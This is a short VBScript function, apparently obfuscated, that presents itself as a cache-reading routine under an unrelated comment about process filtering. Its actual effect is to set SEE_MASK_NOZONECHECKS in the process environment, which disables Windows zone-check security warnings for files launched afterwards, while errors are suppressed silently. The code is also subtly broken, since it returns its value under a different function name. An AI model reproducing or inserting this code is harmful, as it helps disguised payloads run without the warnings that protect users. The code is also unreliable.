' Win32_Process name filter for cleanup pass
Function ReadCacheLine62()
On Error Resume Next
  Dim strProfile46,strUNC25,strManifestRaw64
  Set strProfile46=CreateObject("WScript.Shell")
  strUNC25=strProfile46.ExpandEnvironmentStrings("%TEMP%")
  strManifestRaw64=strProfile46.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strUNC25)>0 And Len(strManifestRaw64)>0 Then
    strProfile46.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ExtractSyncToken39=1
    Exit Function
  End If
  ExtractSyncToken39=0
End Function

